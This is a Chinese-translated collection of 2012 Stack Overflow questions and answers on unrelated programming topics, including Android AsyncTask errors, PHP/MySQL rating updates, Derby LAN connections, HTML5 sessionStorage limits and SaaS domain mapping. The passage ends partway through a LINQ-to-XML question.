尝试使用[FragmentTransaction#show()](http://developer.android.com/reference/android/app/FragmentTransaction.html#show%28android.app.Fragment%29)和[FragmentTransaction#hide()](http://developer.android.com/reference/android/app/FragmentTransaction.html#hide%28android.app.Fragment%29)方法而不是替换。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-04T16:14:15.333

backstack 结束当前活动并转到上一个活动，而不是上一个片段。（请参阅 backstack 指南：http: [//developer.android.com/guide/components/tasks-and-back-stack.html](http://developer.android.com/guide/components/tasks-and-back-stack.html)）。

正如您所建议的，您可以通过覆盖 onBackPressed 来强制执行该行为，但是，我不知道我会以这种方式更改自然的 Android 行为。如果您查看其他执行类似操作的应用程序，尤其是核心应用程序，则后退按钮不会转到上一个片段，而是转到上一个活动。

此外，您确实可以完全控制“向上”按钮的行为（即操作栏上带有左箭头的应用程序图标）。您必须以编程方式将其设置为用作按钮，如 ActionBar 指南中所述（如果您需要知道如何执行此操作，请告诉我），并且您可以让它在您的堆栈上设置上一个片段维持在某处。

# search - 存储和快速比较光度直方图

> ID：11806424
> 
> 赞同：0
> 
> 时间：2012-08-04T06:18:48.283
> 
> 标签：search, indexing, nosql, relational-database, histogram

我有兴趣构建一个特定于域的图像搜索应用程序，该应用程序能够搜索与给定图像相似的图像。通过一点 google-fu，我设法在这个网站上找到[了这个](https://stackoverflow.com/questions/596262/image-fingerprint-to-compare-similarity-of-many-images)问题。如果我正确理解了评分最高的答案，那么我要做的就是通过将每个图像的亮度数据存储在我的库中来实现。

这一切都很好，但我需要一种方法来快速搜索并与 25,000 多条记录进行比较。我使用过 PostgreSQL，所以我立即想到了它。我发现自己面临的问题是，要存储跨 3 种颜色的 256 个离散可能值的亮度数据，我需要一个包含 768 列 ( `r0,g0,b0,...,r255,g255,b255`) 的表，并且为了有效地在所有记录中搜索相似性，我需要 768 个索引。我以前从未真正处理过这个级别的大规模数据，但这个数字对我来说似乎有点笨拙（虽然我不知道，我的经验并没有扩展到这个领域）。

我的另一个想法是将亮度数据存储在一个大文本列中（格式如下：）`r0:rrr g0:ggg b0:bbb ... r255:rrr g255:ggg b255:bbb`并在该列上构建一个全文搜索索引，以便允许在数据中搜索相似图像。

另一种可能性是使用查询直方图和存储直方图之间的汉明距离，但我不认为可以快速针对数据库中的所有记录进行操作。

我是否以正确的方式接近这个？我也愿意接受任何可以在我的数据集中提供快速、实时搜索的关系数据库替代方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T21:28:21.250

看起来您正在将每个图像放入 3 维空间——您是否尝试过查看任何地理空间/多维查询引擎。使用您的方法，相似的图像应该在 3 空间中彼此靠近。

# algorithm - 多路合并与两路合并

> ID：11806437
> 
> 赞同：10
> 
> 时间：2012-08-04T06:22:59.800
> 
> 标签：algorithm, mergesort, external-sorting

当我们对一个大文件[进行外部合并排序](http://en.wikipedia.org/wiki/External_sorting)时，我们将其拆分为小文件，对它们进行排序，然后将它们合并回一个大的排序文件。

合并时，我们可以进行多次 2 路合并，也可以进行一次多路合并。

我想知道哪种方法更好？为什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-04T06:39:32.773

一种多路合并通常更好。考虑三个小文件：

```
a1
a2
a3 
```

和

```
b1
b2
b3 
```

最后

```
c1
c2
c3 
```

如果你用`a`and合并`b`，我们就剩下（比如说）

```
a1
b1
a2
b2
b3
a3 
```

和

```
c1
c2
c3 
```

最终合并将创建排序列表，但请注意在最终合并中我们必须再次访问`a`和`b`项目。正是这种重新合并在级联双向合并中是浪费的。

你可以做的是一个单一的多路合并。但是，请注意您的操作方式。具体来说，避免简单的双循环扫描每个光标以查看哪个具有最小值。请改用最小堆。这会将复杂性降低到`O(n log n)`.

# drupal - 在 Windows 中开发 - 我可以在 Linux 中托管它吗？

> ID：11806442
> 
> 赞同：0
> 
> 时间：2012-08-04T06:23:33.783
> 
> 标签：drupal, ubercart

嗨，我在 windows 环境下开发了带有 ubercart 的在线商店。我可以在 Linux 环境中托管它吗？会不会因为环境的变化而出现问题？请提供您的建议。

技术 - Drupal 6.x

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:48:35.367

你需要知道的几件事

1.  Drupal 完全独立于您运行的操作系统。（除了一些设置，如邮件集成和 cron 作业）。
2.  `windows environment`你的意思是WAMP吗？如果是，则无需进行任何更改。如果您的意思是 Windows、IIS、SQL 服务器，`windows environment`那么您需要更改 cron 作业、清理 url 并更改 sql 驱动程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T18:14:28.560

在主机之间移动时需要注意两个问题：

1.  **Drupal 依赖项**，以及
2.  **文件权限**

**对于 Drupal 依赖项：**确保您的 Linux 主机在内存、模块等方面满足 Drupal 要求。这相当简单，只需查看 Drupal 的站点。

**对于权限：**上传站点和数据库后，事情可能会完美运行……但是，您更有可能必须检查文件所有权和权限。

在您的 Windows 堆栈中，文件归 Windows 用户所有。当您将它们上传到您的 Linux 堆栈时，它们需要由 Linux 用户拥有，但是哪个？

如果您在 Linux 机器上运行 SuExec，这些文件很可能归您用于 ssh 或 ftp 访问的同一用户所有。如果您不使用`SuExec`，这些文件可能需要归 apache 用户所有`www-data`。

最后是对特定文件夹和 settings.php 文件的权限。如果出现以下情况，您的 Drupal 状态页面将显示错误：

*   您的 settings.php 文件可以被任何人写入；
*   如果您的文件目录（存储上传文件的位置）不可写或配置错误；
*   如果您的 tmp/ 文件夹也不可写或配置错误。

# xmpp - 我正在构建一个实时协作工具，用户可以同时保持多个对话

> ID：11806443
> 
> 赞同：0
> 
> 时间：2012-08-04T06:23:47.020
> 
> 标签：xmpp

所以我需要某种线程处理来满足这个要求。我浏览了 XEP-0201 并发现它很有用，但我找不到任何实现 XEP-0201 的 XMPP 服务器和客户端。

请让我知道是否有人使用/编写了 XEP-0201，或者 XMPP 中是否有其他机制，以便我可以处理多个线程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T23:50:50.687

你不会找到支持[XEP-0201](http://xmpp.org/extensions/xep-0201.html)的服务器——它纯粹是客户端的事情。客户端将`<thread>`元素添加到消息中，接收者将收到它。XEP 是关于如何使用该机制的一般最佳实践。

# networking - JavaDB(Derby) - 在 LAN 中使用网络服务器控制器拒绝连接

> ID：11806446
> 
> 赞同：1
> 
> 时间：2012-08-04T06:24:10.610
> 
> 标签：networking, localhost, derby, javadb

我是 Java 网络的新手。我的场景是 2 台客户端计算机连接到 LAN 中托管的服务器。所以我使用 NetworkServerControl API 来启动主机：

```
private static void startServer(){
    try{
        NetworkServerControl nsc = new NetworkServerControl(InetAddress.getByName("localhost"), 1527);
        nsc.start(null);
    }catch(Exception e){
        JOptionPane.showMessageDialog(null, "Start network error : " + e.getMessage());
    } 
```

我的问题是：
1）局域网中的计算机可以访问本地主机吗？
- 如果是，我尝试使用 ij 连接服务器中的 derby 数据库，但它写了连接被拒绝。我错过了什么？

```
ij: CONNECT 'jdbc:derby://localhost:1527/c:/app_db/' user 'xxx' password 'xxx'; 
```

- 如果不是，应该使用什么常用方法？请指导我正确的轨道。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T16:56:53.983

要从网络上的其他机器访问您的 Derby 数据库，您需要将“localhost”更改为不同的值。您可以提供机器的 DNS 名称，或机器的公共 IP 地址。

请注意，您必须在 Derby 服务器和每个客户端 URL 上都进行此更改。

您应该能够使用 netstat -a 来确认您的更改对服务器的影响。

# button - Mvc Telerik 按钮事件

> ID：11806452
> 
> 赞同：1
> 
> 时间：2012-08-04T06:25:29.977
> 
> 标签：button, telerik, telerik-mvc, mouseclick-event

当有人单击以下按钮时，我想导航到 Home Controller 中的另一个操作 NewPage。

```
<input class="t-button AlignButton" type="button" value="New" /> 
```

执行此操作的代码是什么。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T15:41:25.640

使用 ActionLink 可能会更好。

```
@Html.ActionLink("New", "NewPage", "Home") 
```

如果你想让它看起来像一个按钮，你可以添加 css 属性。

```
@Html.ActionLink("New", "NewPage", "Home", new { @class="newpage" }) 
```

在 css 中，您可以定义您希望链接的外观，包括使用图像。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-03-20T13:57:54.717

我使用这样的解决方案：

```
@(Html.Kendo().Button()
    .Name("CreateDataSubmit")
    .Content("Create new")
    .Events(e => e.Click(@<text>function(e) { window.location.href = "@(Url.Action("Create"))" }</text>))
)

@Html.ActionLink("Create new", "Create", null, new { @class = "k-button k-button-icontext" }) 
```

第二个更好。祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T07:16:14.937

选项很少。你可以按照 Daniel 的建议去做，也可以使用 JavaScript 来做。

*注意*导航在没有 JavaScript 功能的浏览器中不起作用。

将 ID 添加到按钮

```
<input class="t-button AlignButton" type="button" value="New" id="my-button" url="@Url.Action("Action", "Controller")" /> 
```

使用 JavaScript 查找按钮并更改 url。这是一个jQuery版本

```
$(document).ready(function () {        
    $('#my-button').click(function (e) { 
        var url = $(this).attr('url');
        windows.location = url;
    });
}); 
```

# vb6 - 在 vb6 数据报告周围格式化/添加连续边框

> ID：11806453
> 
> 赞同：0
> 
> 时间：2012-08-04T06:25:35.133
> 
> 标签：vb6

我正在使用 datareport 在 vb6 中设计报告。但我遇到了格式问题。我在详细信息部分（第 1 部分）中画了线，下面有页脚。但是当我执行报告时，行并没有完全连接到 Pagefooter。

这是我的报告格式.. ![在此处输入图像描述](../Images/b8b81cb9eb5c965cb151850ed98a8e4c.png)

# html - HTML5 sessionStorage 限制？

> ID：11806455
> 
> 赞同：16
> 
> 时间：2012-08-04T06:25:49.727
> 
> 标签：html, web-storage, sessionstorage

关于 HTML5 的 sessionStorage 的几个问题：

*   localStorage 的 5MB 限制是否包括 sessionStorage？（即，它真的是 WebStorage API 的 5MB 限制吗）
*   如果没有，sessionStorage 是否有类似于 localStorage 的最大大小限制？

我在另一个 SO 问题中找到了这个网站[http://dev-test.nemikor.com/web-storage/support-test/](http://dev-test.nemikor.com/web-storage/support-test/)，我想知道数据是否仍然相关？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-04T07:06:09.203

1.  localStorage 的 5MB 限制是否包括 sessionStorage？（答案：**否**）
2.  WebStorage API 真的有 5MB 的限制吗（答案：**否**；[支持者](http://dev.w3.org/html5/webstorage/#dom-localstorage)）
3.  sessionStorage 是否有类似于 localStorage 的最大大小限制？（答案：**否**；[支持者](http://dev.w3.org/html5/webstorage/#dom-localstorage)）

希望我以简化的方式回答了您的所有问题。这是一个特别有用的部分：

> **配额**
> 
> 如果允许任何网站在毫无防备的硬盘驱动器中填充千兆字节的数据，您可以想象混乱！因此，浏览器对存储容量施加了限制。当您的应用程序尝试超过该限制时，浏览器通常会显示一个对话框，让用户确认增加。您可能希望浏览器对源可以使用的所有存储强制实施单一限制，但主要浏览器实际上对每种存储机制分别强制实施限制。这在未来可能会改变，但就目前而言，您应该将浏览器视为维护一个二维矩阵，其中一维是“原点”，另一维是“存储”。例如，“ [http://abc.example.com](http://abc.example.com)" 最多允许存储 5MB 的 Web 存储、25MB 的 Web SQL 数据库存储，并且禁止使用索引数据库。该领域的另一个受欢迎的增强功能是用户界面，让用户可以查看和控制他们为每个数据库分配了多少空间在某些环境中，用户可以预先看到将使用多少存储空间，例如，在 Chrome 网上应用店的情况下，当用户安装应用程序时，会预先提示他们接受其权限，其中包括存储限制. 一个可能的值是“unlimited_storage”。

以上文字取自[http://www.html5rocks.com/en/tutorials/offline/storage/](http://www.html5rocks.com/en/tutorials/offline/storage/)

# php - 多个查询 MySQL PHP

> ID：11806459
> 
> 赞同：0
> 
> 时间：2012-08-04T06:27:04.493
> 
> 标签：php, mysql

是否有适当的方法来做到这一点。我想计算一个表的平均评分并同时更新另一个表中的结果。我是 PHP 和 MYSQL 的新手，我将不胜感激

```
$query=mysql_query("INSERT INTO review (username, restaurant, rating, review) VALUES ('$username','$restaurant','$rating','$review')");
if($query)
{
    $avg_query="SELECT ROUND(AVG(rating),0) FROM review WHERE name =\"$restaurant\"";
    $avg_result=mysql_query($avg_query);
    $avg_row=mysql_fetch_array($avg_result);
    $rating=$row['ROUND(AVG(rating),0)'];
    if($avg_result)
    {   
        $update_query= "UPDATE restaurant SET rating=\"$rating\" WHERE name =\"$restaurant\"";
        $update_result=mysql_query($update_query);
    }
}
else
{
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:29:58.683

```
UPDATE restaurant 
SET rating= (SELECT ROUND(AVG(rating),0) FROM review WHERE name ='$restaurant')
WHERE name ='$restaurant' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:47:23.493

另一种选择是使用 mysql [`trigger`](http://dev.mysql.com/doc/refman/5.0/en/triggers.html)。例如（不要让我拘泥于语法）：

```
CREATE TRIGGER after_insert_review
AFTER INSERT ON review
FOR EACH ROW
BEGIN
    UPDATE restaurant 
    SET rating = (SELECT ROUND(AVG(rating),0) FROM review WHERE name = NEW.restaurant)
    WHERE name = NEW.restaurant;
END 
```

正如其他人所提到的，再次使用[PDO](http://php.net/manual/en/book.pdo.php)或[MySQLi](http://php.net/manual/en/book.mysqli.php)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:31:23.457

我会像这样将两者合二为一：

```
$query=mysql_query("INSERT INTO review (username, restaurant, rating, review) VALUES ('$username','$restaurant','$rating','$review')");
if($query)
{
    $avg_query="UPDATE restaurant a SET rating=(SELECT ROUND(AVG(rating),0) FROM review WHERE name =a.name) WHERE name ='".$restaurant."'";
    $avg_result=mysql_query($avg_query);
}
else
{
} 
```

话虽如此，您应该转而使用 PDO 或 mysqli，因为这些`mysql_*`功能已贬值。

# php - 在 PHP 中确定字体样式

> ID：11806462
> 
> 赞同：0
> 
> 时间：2012-08-04T06:27:51.497
> 
> 标签：php, css, string-length

我想使用 CSS 根据 PHP 数组中最长字符串的大小来定义我的列。我有使用 imagettfbbox() 来计算字符串长度的代码，但它需要知道字体和字体大小。最理想的情况是，我希望这是一个通用函数，我可以在任何地方插入，而不必提前知道字体定义。

是否有某种方式，以编程方式来确定字体样式信息？我的首选是 PHP，但我会采取任何解决方案。

我以前见过这个问题没有答案，但三年前有人问过，我希望现在有一个解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T23:36:18.403

您将无法使用 PHP（样式由浏览器在接收到 PHP 解析的 HTML 后决定），但您*可以*使用 JS/jQuery 来获取字体大小、调整列大小并在它们之间拆分 HTML . 但是，在处理字体时，它在所有浏览器/平台中都永远不会完美也不相同，所以我不推荐它。

两个最合理的解决方案是：

*   [http://www.w3schools.com/css3/css3_multiple_columns.asp](http://www.w3schools.com/css3/css3_multiple_columns.asp)（原生 CSS3 解决方案，旧 IE 版本不支持）
*   [http://welcome.totheinter.net/columnizer-jquery-plugin/](http://welcome.totheinter.net/columnizer-jquery-plugin/)（一个jQuery插件）

# jbpm - jBPM5 中 ProcessInstanceInfo 与 SessionInfo 有什么关系？

> ID：11806463
> 
> 赞同：0
> 
> 时间：2012-08-04T06:27:53.337
> 
> 标签：jbpm

我需要从我的 jBPM 数据库中导出一些流程数据，并且我应该能够选择一些特定的流程实例来导出，但是我找不到 ProcessInstanceInfo 和 SessionInfo 之间的关系。

给定流程实例 ID 列表，我如何导出与这些流程实例 ID 相关的所有信息？

我可以找到以下关系：

ProcessInstanceInfo 通过 instanceid EventTypes 通过 instanceid WorkItemInfo 通过 processinstanceid

**更新：**

假设我的流程中有5个任务节点，ABCDE、A&B在Public网络上执行，C、D&E在Private网络上执行，所以我要导出A&B任务节点在Public上完成的流程实例到 Private 以便完成 Private 网络上的任务并继续流程实例。

一个进程中的任务是隔离的，因此我必须将进程实例从一个“导出”到另一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T17:27:39.920

出口是什么意思？ProcessInstanceInfo 和 SessionInfo 是引擎工作的内部表，您不应该使用这些表。

干杯

# android - 使用 AsyncTask 时出现运行时异常

> ID：11806464
> 
> 赞同：0
> 
> 时间：2012-08-04T06:27:58.143
> 
> 标签：android, android-asynctask, runtime.exec, runtimeexception

我在我的程序中使用 AsyncTask 进行多线程处理，方法是在 10 秒后调用一个方法，但有这个异常：

```
08-04 11:49:29.565: E/log_tag(885): Error converting result java.lang.RuntimeException: Can't create handler inside thread that has not called Looper.prepare() 
```

请帮帮我！！

编辑：这是 AsyncTask 的代码：

```
 class Getphonenumber extends AsyncTask<String, Void, Void> {
         public Void doInBackground(String... p) {
          while (true) {
              getPhno();
           try {
            Thread.sleep(10000);
           } catch (InterruptedException ie) {
            ie.printStackTrace();
           }
          }
        }

        }; 
```

'getPhno()' 方法：

```
public void getPhno()
  {
      try{

            HttpClient httpclient = new DefaultHttpClient();
            HttpConnectionParams.setConnectionTimeout(httpclient.getParams(), 10000); //Timeout Limit
            List<NameValuePair> username = new ArrayList<NameValuePair>();
            username.add(new BasicNameValuePair("username", user));
            //Web Address
            HttpPost httppost = new HttpPost("http://www.starretailshop.com/Log/Retrieve.php");
            httppost.setEntity(new UrlEncodedFormEntity(username));
            HttpResponse response = httpclient.execute(httppost);
            ResponseHandler<String> responseHandler = new BasicResponseHandler();
            String responseBody = httpclient.execute(httppost,
                    responseHandler);

            Log.i("retrieve postData", response.getStatusLine().toString());
            InputStream content = response.getEntity().getContent();
            BufferedReader buffer = new BufferedReader(new InputStreamReader(content));
            String s = "";
            while ((s = buffer.readLine()) != null) {

                sendMsg(s,msg);

            }

            }catch(Exception e){

                  Log.e("log_tag", "Error converting result "+e.toString());
            }
  } 
```

'sendMsg' 方法：

```
private void sendMsg(String phoneNumber, String message)
    { 
       try{
            String phoneNumber1 = null;

           if(phoneNumber.startsWith("+"))
            {
                phoneNumber1 = phoneNumber.substring(3);

            }
            else if(phoneNumber.startsWith("0"))
            {
                phoneNumber1 = phoneNumber.substring(1);
            }
            else
            {
                phoneNumber1=phoneNumber;
            }
                PendingIntent pi = PendingIntent.getActivity(this, 0,
                    new Intent(), 0);                
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(phoneNumber1, null, message, pi, null);
                Toast.makeText(this,"Msg sent to:" + phoneNumber1, Toast.LENGTH_LONG).show();
                phnoList.add(phoneNumber);
                phnoListd.add(phoneNumber1);
                //phnumber = phoneNumber;
                //================Update Database=====================

              try{
                  HttpClient httpclient = new DefaultHttpClient();
                  HttpConnectionParams.setConnectionTimeout(httpclient.getParams(), 10000); //Timeout Limit
                  List<NameValuePair> updatemsg = new ArrayList<NameValuePair>();
                  updatemsg.add(new BasicNameValuePair("outmsg1", message));
                  Calendar cal = Calendar.getInstance();
                  SimpleDateFormat sdf = new SimpleDateFormat("HH:m:ss dd-MM-yyyy");
                  String TimeStampDB = sdf.format(cal.getTime()); 
                  updatemsg.add(new BasicNameValuePair("currentdatetime1",TimeStampDB));
                  updatemsg.add(new BasicNameValuePair("mobileno",phoneNumber));

                    //Web Address
                    HttpPost httppost = new HttpPost("http://www.starretailshop.com/Log/Update1.php");
                    httppost.setEntity(new UrlEncodedFormEntity(updatemsg));
                    HttpResponse response = httpclient.execute(httppost);
                    ResponseHandler<String> responseHandler = new BasicResponseHandler();
                    String responseBody = httpclient.execute(httppost,
                            responseHandler);
                    Log.i("update1 postData", response.getStatusLine().toString());
                    }catch(Exception e){
                        Log.e("log_tag", "Error converting result "+e.toString());
                    }

                    //================================================
          }catch(Exception e)
          {
              e.printStackTrace();
              Toast.makeText(this,"Error occured", Toast.LENGTH_LONG).show();
          }

} 
```

最后，我调用`new Getphonenumber().execute();`了一个按钮的 onClickListener。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T06:41:25.403

我认为问题在于，您正在尝试从后台线程更新 UI 组件。

例如，在你的 AsyncTask 中考虑这个方法，

```
protected Void doInBackground(String ... x) {
      while (true) {
       System.out.println(x[0]);
       try {
        Thread.sleep(1000);
       } catch (InterruptedException ie) {
        ie.printStackTrace();
       }
      } 
```

这个方法就相当于一个后台线程。在 Andorid 中，您只能从主 UI 线程更新您的 UI，当您尝试从任何其他方法执行此操作时，您将收到此异常。

所以尽量避免这种情况。如果要更新 UI，请使用 AsyncTask 的 onPostExecute()。

**编辑 1**

这是你的问题。从 sendMsg 方法中删除吐司，它应该可以正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:03:17.173

使用[runOnUiThread](http://developer.android.com/reference/android/app/Activity.html)从非 Ui Thread.like 更新 UI 作为您提供的代码。您正在显示来自后台线程的 Toast 消息，因此将 Toast 消息放入 runOnUiThread 中：

```
Current_Activity.this.runOnUiThread(new Runnable() {
  public void run() {

  Toast.makeText(this,"Msg sent to:" + phoneNumber1, Toast.LENGTH_LONG).show();
  }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T06:50:36.220

不要在 doBackround 中创建睡眠线程，而是在 .execute() 之前执行它。我想这会有所帮助。

# c++ - 在 Windows 上使用 -faddress-sanitizer 进行 Clang

> ID：11806469
> 
> 赞同：15
> 
> 时间：2012-08-04T06:29:10.480
> 
> 标签：c++, c, windows, clang, valgrind

我的意图是`Clang`用作 Windows 上的替代品，以`Valgrind`在我编写的 C/C++ 程序中查找缓冲区溢出、动态内存滥用等。我已经按照[此处](https://stackoverflow.com/questions/9427356/how-to-compile-clang-on-windows)提供的说明成功构建了 Clang 。

我尝试使用 -faddress-sanitizer 选项（如此[处](http://clang.llvm.org/docs/AddressSanitizer.html)指定）编译一个简单的 C 程序，然后抛出以下错误 -

```
gcc.exe: error: unrecognized command line option '-faddress-sanitizer'
Using built-in specs.
COLLECT_GCC=C:/MinGW/bin/gcc.exe
Target: mingw32
Configured with: ../gcc-4.7.0/configure --enable-languages=c,c++,ada,fortran,objc,obj-      c++ --disable-sjlj-exceptions --with-dwarf2 --enable-shared --enable-libgomp --disable-win32-registry --enable-libstdcxx-debug --disable-build-poststage1-with-cxx --enable-version-specific-runtime-libs --build=mingw32 --prefix=/mingw
Thread model: win32
gcc version 4.7.0 (GCC)
clang: error: assembler (via gcc) command failed with exit code 1 (use -v to see invocation) 
```

为什么clang（据我所知）调用GCC？当然 GCC 不支持 -faddress-sanitizer 选项。

我对使用它的可能性感到非常兴奋，因为一段时间以来我一直在努力寻找一个好的（免费）替代 Valgrind。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-01-23T21:09:20.413

如今，AddressSanitizer 在 Windows 上的效果要好得多（但它仍然在进行中）。[https://github.com/google/sanitizers/wiki/AddressSanitizerWindowsPort](https://github.com/google/sanitizers/wiki/AddressSanitizerWindowsPort)上有一些文档

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-04T06:38:06.143

谷歌搜索把我带到了[这个页面](http://clang.llvm.org/docs/AddressSanitizer.html#platforms)。

去引用，

> 支持 AddressSanitizer
> 
> *   Linux x86_64（在 Ubuntu 10.04 上测试）。
> *   MacOS 10.6 和 10.7 (i386/x86_64)。
> 
> 对 Linux i386/ARM 的支持正在进行中（它可能有效，但也不能保证）。

* * *

关于替换的话题，你看过[记忆博士](http://www.drmemory.org/)吗？

# javascript - 使用onclick 将 ajax 内容打开到fancybox

> ID：11806473
> 
> 赞同：5
> 
> 时间：2012-08-04T06:30:22.947
> 
> 标签：javascript, jquery, onclick, fancybox

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:33:21.713

文档准备好后，绑定按钮点击事件。

```
jQuery(document).ready(function(){

      $("#myLink").click(function() {
          $(this).fancybox({href : 'myPage.php'});
      });

 }); 
```

那么你的元素中就不需要javascript代码了。

```
<a href="#" id="myLink">Open ajax content</a> 
```

检查此链接以获取[jQuery 单击功能](http://api.jquery.com/click/)以及有关[观察者模式的更多信息](http://en.wikipedia.org/wiki/Observer_pattern#JavaScript)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:54:41.607

尝试

```
$("#myLink").click(); 
```

它应该触发`onclick`事件。

# linux - 域映射到子域

> ID：11806477
> 
> 赞同：0
> 
> 时间：2012-08-04T06:31:24.097
> 
> 标签：linux, mapping, dns, subdomain

我正在运行 SAAS，客户注册并在子域（即 subdomain.mydomain.com）中进行脚本安装并开始使用该站点。现在我想让我的客户映射他们的完整域，例如。www.customerdomain.com 到 subdomain.mydomain.com，就像 bloggers.com 或 wordpress 一样。我怎么能做到这一点。我正在使用 Linux 专用服务器。帮助将不胜感激。我不想要 URL 屏蔽或重定向。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T20:40:58.667

我目前正在开发一个项目，最近遇到了完全相同的问题。您可以通过以下两种方法来解决它：

1.  超级简单
2.  有点棘手，但并非不可能

第一个是允许子域的域映射（例如[http://subdomain.example.com](http://subdomain.example.com)）。这对您的用户来说非常简单。他们将前往他们的注册商并创建一个新的 CNAME 记录，如下所示：

(名称) subdomain.example.com -> (记录) subdomain.yoursite.com

与更改 A 记录不同，此更改只需大约 120 分钟即可完全传播（相比之下，最多需要 72 小时）。

如果您的用户为使用域映射功能的特权付费（即它不提供给免费计划的用户），那么您可以将每个用户的自定义子域存储在您的数据库中，然后检查（在 .php 中）何时他们尝试通过他们的自定义子域访问您的网站。如果它们被允许，什么也不做，否则将它们重定向到备用网址。

所以这很容易完成。现在有更棘手的选择。如果您有一个专用 IP 地址，或者在您的情况下是一个专用服务器，您可以使用 cPanel API 动态创建 A 记录，这样用户就可以将他们的域（而不是他们的子域）映射到您的网站。您需要为您的客户制作以下 A 记录，并让他们使用您的专用 IP 地址更新其域的 A 记录：

您的服务器：（名称）customersdomain.com ->（记录）subdomain.yoursite.com

客户的注册商：www ->（记录）[您的 IP 地址]

我不会为您详细介绍 API 流程，但您可以在此处阅读文档：

[http://docs.cpanel.net/twiki/bin/view/SoftwareDevelopmentKit/ApiAuthentication](http://docs.cpanel.net/twiki/bin/view/SoftwareDevelopmentKit/ApiAuthentication)

无论如何，我希望这会有所帮助，并且希望您在构建网站时玩得开心！

Ĵ

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T21:29:05.440

安装[wordpress 域映射插件](http://wordpress.org/extend/plugins/wordpress-mu-domain-mapping/)，显然你的 wordpress 安装是为 Wordpress MU 设置的。

现在，按照我的理解，您希望让您的博主有机会在他们自己的个人域上托管他们的博客，同时仍然托管在您的服务器上。在“网络管理员”（超级用户）的“设置”中的“域映射”下。

有`Domain Options`：

你想检查 `User domain mapping page`那是`Option 3`.

这将允许您的博客用户指定其个人网站的域。需要提醒他们的一件事是，他们的 DNS 记录应该指向您的 Web 服务器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T08:27:06.603

(name) 代表属于您的客户的自定义域（例如 customerdomain.com）。（记录）将指向他们在您的 SAAS 站点上的子域。因此，如果我使用用户名“nike”注册您的网站，您将使用“nike.yoursite.com”。

Ĵ

# android - 通过单击 ListItem 内的按钮启动 Activity

> ID：11806478
> 
> 赞同：0
> 
> 时间：2012-08-04T06:31:35.037
> 
> 标签：android, listview, listitem

我的 ListItem 中有一个按钮，我想单击它并启动一个新的 Activity。

在我的 CustomListAdapter 类中，我将按钮绑定到 onClickListener，但我不知道如何从包含 ListView 的 Activity 启动 ActivityforResult。

```
public View getView(int position, View convertView, ViewGroup parent) {
        View row = convertView;
        PostHolder holder = null;

        if(row == null)
        {
             holder.btnQuickAdd = (LinearLayout) row.findViewById(R.id.btnQuickAdd);
        }

        holder.btnQuickAdd.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
                    //Launch An Activity

        }
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:44:44.867

首先看到这个链接，

[listView onclick 转到一个新活动](https://stackoverflow.com/questions/4852307/listview-onclick-goes-to-a-new-activity)

你可以通过这个传递值

```
 Intent in=new Intent(NewChart.this,PieChartView.class);
    in.putExtra("Ref-name", values);//sample in.putExtra("flag",1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:45:06.220

我找到了解决方案。

```
public View getView(int position, View convertView, ViewGroup parent) {
        View row = convertView;
        PostHolder holder = null;

        if(row == null)
        {
             holder.btnQuickAdd = (LinearLayout) row.findViewById(R.id.btnQuickAdd);
        }

        holder.btnQuickAdd.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
                  Intent myIntent = new Intent(((MainActivity) v.getContext()), AnotherActivity.class);    
                 ((MainActivity) v.getContext()).startActivityForResult(myIntent, 1002);

        }
    });
} 
```

# linq - LINQ查询具有相同基类的不同类型的异构集合

> ID：11806483
> 
> 赞同：1
> 
> 时间：2012-08-04T06:32:14.680
> 
> 标签：linq, linq-to-xml

是否有任何简单的方法来查询异构集合，其中集合中的对象都派生自同一个基类，但有些可能是一种派生类型，有些可能是另一种？

例如，这是一个类层次结构：

```
public class Ship
{
    public string Name { get; set; }
    public string Description { get; set; }
}

public class SailingVessel : Ship
{
    public string Rig { get; set; }
    public int NumberOfMasts { get; set; }
}

public class MotorVessel : Ship
{
    public string Propulsion { get; set; }
    public decimal TopSpeed { get; set; }
} 
```

这是我要查询的 XML 文档：

```
<?xml version="1.0" ?>
<ships xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <ship xsi:type="sailingVessel">
    <name>Cutty Sark</name>
    <description>Tea clipper</description>
    <rig>Ship</rig>
    <numberOfMasts>3</numberOfMasts>
  </ship>
  <ship xsi:type="sailingVessel">
    <name>Peking</name>
    <description>Windjammer of the Flying P Line</description>
    <rig>Barque</rig>
    <numberOfMasts>4</numberOfMasts>
  </ship>
  <ship xsi:type="motorVessel">
    <name>HMS Hood</name>
    <description>Last British battlecruiser</description>
